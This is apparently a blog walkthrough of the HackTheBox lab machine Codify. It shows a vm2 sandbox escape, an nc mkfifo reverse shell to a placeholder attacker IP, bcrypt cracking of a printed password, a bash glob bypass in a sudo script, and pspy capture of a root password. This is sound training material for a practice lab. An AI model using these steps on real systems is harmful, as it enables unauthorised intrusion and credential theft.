---
layout: post
title: 'Codify - HTB Walkthrough'
date: 2026-05-09 00:00:00 +0000
categories: [cybersecurity]
tags:
  - hackthebox
  - writeup
description: "Room link: https://app.hackthebox.com/machines/Codify"
image: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/57b977ea744af01a5454c8643a850e59.png"
---



---

## Reconnaissance

Every good engagement starts with a thorough scan. We kick things off with a full Nmap run against the target:

```bash
nmap -sC -sV -Pn -oA nmap/Codify 10.129.23.61
```
![70d3c1142f36952e4f45c910f15f7e9333e0993c212ad9132382374153466ab1](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/70d3c1142f36952e4f45c910f15f7e9333e0993c212ad9132382374153466ab1.png)  

 

The results come back clean and telling:

```
PORT     STATE  SERVICE  VERSION
22/tcp   open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
80/tcp   open   http     Apache httpd 2.4.52
3000/tcp open   http     Node.js Express framework
```

Three open ports. SSH on 22 is standard. Port 80 is running Apache but immediately redirects to `http://codify.htb/`, and port 3000 is exposing a Node.js Express app. We add the hostname to our hosts file:

```bash
sudo nano /etc/hosts
# Add: 10.129.23.61    codify.htb
```
![24916f219cc4a16317a7b4e85515219d76526701dd318b4522d8a26055aa17c8](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/24916f219cc4a16317a7b4e85515219d76526701dd318b4522d8a26055aa17c8.png)  


Now we can browse to the site properly.

---

## Exploring the Web Application

Navigating to `http://codify.htb` greets us with a sleek web app called **Codify**, which bills itself as a Node.js sandbox - a place to write and run JavaScript code directly in the browser without any local setup.
![f3d0c7aff00f5db36eafa9fae7adb1fa1d66d02abe6dd384e70e05511b2b3cf0](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/f3d0c7aff00f5db36eafa9fae7adb1fa1d66d02abe6dd384e70e05511b2b3cf0.png)  
![d07da5da7223fe61a3009de9e24e05fe8fb98b4045d5bcca9b35677cce1564b9](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/d07da5da7223fe61a3009de9e24e05fe8fb98b4045d5bcca9b35677cce1564b9.png)  

The Editor page has a code input box and a Run button. The About Us page is where things get really interesting. Buried in the description is this gem:
![b15dfe1087b78f2090175dec6e303c3d2df7df67dbd7d358969221d700aa8cb5](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/b15dfe1087b78f2090175dec6e303c3d2df7df67dbd7d358969221d700aa8cb5.png)  

> "The **vm2** library is a widely used and trusted tool for sandboxing JavaScript..."

They're using vm2 version **3.9.16**. A quick trip to Exploit-DB confirms our suspicions:

[https://www.exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)

**EDB-ID:** 51898 - **vm2 Sandbox Escape**, affecting vm2 <= 3.9.19. This is our way in.
![9096454507d321fcc89f4abebc045eb9fd2a676caad46c89eae3f8c395ed4839](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/9096454507d321fcc89f4abebc045eb9fd2a676caad46c89eae3f8c395ed4839.png)  

![c3d0038b8ab58b2058fa6b8ac5c6b6b52fdcc6d5d1142eaee8c6964ddacb3e30](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/c3d0038b8ab58b2058fa6b8ac5c6b6b52fdcc6d5d1142eaee8c6964ddacb3e30.png)  


---

## Initial Access - vm2 Sandbox Escape

The exploit abuses how vm2 handles error constructors. By crafting a malicious Proxy object that intercepts the stack trace and gains access to the host process, we can break out of the sandbox entirely.

We paste the exploit into the editor. The key part sets a command variable and uses `child_process.execSync` to run it on the underlying system:

```javascript
const proxiedErr = new Proxy({}, handler);
throw proxiedErr;
} catch ({ constructor: c }) {
    const childProcess = c.constructor('return process')
    ().mainModule.require('child_process');
    childProcess.execSync('${command}');
}
```
![8476f928068c87a7fe7fe602198e8c5a3eb61626e2d9fd83b8d5cb94bef4c333](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/8476f928068c87a7fe7fe602198e8c5a3eb61626e2d9fd83b8d5cb94bef4c333.png)  

Running `cd /home;ls` through the editor reveals two home directories:

```
joshua
svc
```
![214a3d6ba999ab7b2f37c01f3d43f891253b96e318a041c8876ca11a04466f20](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/214a3d6ba999ab7b2f37c01f3d43f891253b96e318a041c8876ca11a04466f20.png)  


We're currently running as `svc`. Time to get a proper shell. We head to a reverse shell generator, set our IP and port 4444, and grab an nc mkfifo payload:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -l 2>&1|nc Attacker_IP 4444 >/tmp/f
```
![fbefa21354929ea5594b63d7c021f2761987363e90e0b138728345288f105b0c](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/fbefa21354929ea5594b63d7c021f2761987363e90e0b138728345288f105b0c.png)  

On our machine, we stand up a listener:

```bash
rlwrap nc -nlvp 4444
```

We fire the payload through the editor and get a hit. We're in as `svc`.
![07ebb05621189d53b8378c9bcb26792fc210362f4168584285b659c509dcf384](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/07ebb05621189d53b8378c9bcb26792fc210362f4168584285b659c509dcf384.png)  

---

## Lateral Movement - Cracking Joshua's Password

With a shell in hand, we poke around the web application's files:

```bash
cd /var/www
ls
# contact  editor  html
cd contact
ls
# index.js  package.json  package-lock.json  templates  tickets.db
```

A SQLite database. Let's dump it:

```bash
cat tickets.db
```

Scrolling through the binary output, we spot a users table with a bcrypt hash for user `joshua`:

```
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```
![496f32c9bc913ff851cf479efcf0cd9f0c69193f2a7595aa78ca30988f0689f2](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/496f32c9bc913ff851cf479efcf0cd9f0c69193f2a7595aa78ca30988f0689f2.png)  


We pull the hash to our local machine and crack it with hashcat:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Hashcat works its magic and the result pops out:

```
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
```
![83fba09954fa67c347a1ffdd709b6b7c05d41b2099b9c478a950a8fb8cd9893c](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/83fba09954fa67c347a1ffdd709b6b7c05d41b2099b9c478a950a8fb8cd9893c.png)  


Joshua's password is `spongebob1`. We SSH in:

```bash
ssh joshua@10.129.23.61
```

We're in. The `user.txt` flag is sitting right there in the home directory.

![e77cc7535106f7f5fa5dd87a55b3ea5d4ff57bbdc4a036f5066f09745558f9be](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/e77cc7535106f7f5fa5dd87a55b3ea5d4ff57bbdc4a036f5066f09745558f9be.png)  
![98ff23fc45b71ceba1ce81d15fcfc3e224bc96cad2932919a582189ebfeea537](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/98ff23fc45b71ceba1ce81d15fcfc3e224bc96cad2932919a582189ebfeea537.png)  

---

## Privilege Escalation - Bash Pattern Matching Bug

Time to see what Joshua can do:

```bash
sudo -l
```

Output:

```
User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```
![8231def968bd5ed66a9447fb966afd2b9c3d412669f20f573132d1f48d794efb](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/8231def968bd5ed66a9447fb966afd2b9c3d412669f20f573132d1f48d794efb.png)  


We can run a MySQL backup script as root. Let's read it:

```bash
cat /opt/scripts/mysql-backup.sh
```

The script reads a password from the user, then checks it against the real root DB password stored in `/root/.creds`:
![a8f6eed9725b28f7c95ec2562bc7a2e04eaccd53fb226755a6064b399a97c0bc](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/a8f6eed9725b28f7c95ec2562bc7a2e04eaccd53fb226755a6064b399a97c0bc.png)  


```bash
DB_USER="root"
DB_PASS=$(cat /root/.creds)

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS

if [[ $DB_PASS == $USER_PASS ]]; then
    echo "Password confirmed!"
else
    echo "Password confirmation failed!"
    exit 1
fi
```

Here's the critical vulnerability. The comparison `[[ $DB_PASS == $USER_PASS ]]` does **not** quote the right-hand side. In bash double-bracket tests, an unquoted right-hand value is treated as a **glob pattern**, not a literal string. That means if we enter `*` as the password, it matches anything - including the real password.

![863903d267e994a649f047281136aaafb42eb8e218d4f499e2499d041c361859](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/863903d267e994a649f047281136aaafb42eb8e218d4f499e2499d041c361859.png)  


```bash
sudo /opt/scripts/mysql-backup.sh
# Enter MySQL password for root: *
# Password confirmed!
```

We're confirmed. But we still need the actual password. We use **pspy** to monitor processes in real time. We transfer it to the target:

```bash
# On our machine (from ~/transfers):
python3 -m http.server 80

# On the target:
wget http://10.10.16.37/pspy64
chmod +x pspy64
./pspy64
```
![2f162be9277ca80f838956c7c9e4111593ad7db18b0f3158abe0526575a99f61](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/2f162be9277ca80f838956c7c9e4111593ad7db18b0f3158abe0526575a99f61.png)  
![e5d8ad8b08005c69e8cf491ef74b1111058cad965ca19ed1548d54affbb48e2b](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/e5d8ad8b08005c69e8cf491ef74b1111058cad965ca19ed1548d54affbb48e2b.png)  


In a second tab, we run the backup script again:

```bash
sudo /opt/scripts/mysql-backup.sh
```
![58e680d4fbe57fb79c59f82c9a9b5be272f4fe564ceea7c8db8f85704bba556c](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/58e680d4fbe57fb79c59f82c9a9b5be272f4fe564ceea7c8db8f85704bba556c.png)  

In the pspy output, we catch the mysqldump command being executed with the password in plaintext:
![81fbe86bb64d8380d5e3855cd7dff56755e434e23006ceaad23c1b1cfdc675af](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/81fbe86bb64d8380d5e3855cd7dff56755e434e23006ceaad23c1b1cfdc675af.png)  

```
CMD: UID=0  PID=4985  | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -p<THEPASSWORD> mysql
```

We now have root's MySQL password, which also happens to be the system password. We switch user:

```bash
su
# Password: <password from pspy>
```

We're root. Navigate to `/root` and collect the flag:

```bash
cd /root
cat root.txt
```
![7877b3d02655208b51f02830064872c040f2a677f65742dc31b7884a87769f3a](https://raw.githubusercontent.com/Hemantha-krishna/ctf-images/main/posts/2026-05-09-Codify-htb-walkthrough/7877b3d02655208b51f02830064872c040f2a677f65742dc31b7884a87769f3a.png)  

---

## Summary

Codify was a satisfying chain of vulnerabilities that required both web exploitation knowledge and Linux privilege escalation fundamentals:

1. **Enumeration** revealed a Node.js sandbox using the vulnerable vm2 library.
2. **vm2 Sandbox Escape (EDB-51898)** gave us RCE as `svc`.
3. **Credential Discovery** - a bcrypt hash in a local SQLite database cracked to `spongebob1`, letting us pivot to `joshua`.
4. **Bash Glob Injection** - an unquoted variable in a sudo-accessible shell script allowed wildcard matching, and pspy exposed the root password in a live process listing.

The key lesson from the privesc: always quote your variables in bash conditionals. `[[ "$DB_PASS" == "$USER_PASS" ]]` would have stopped the glob trick cold.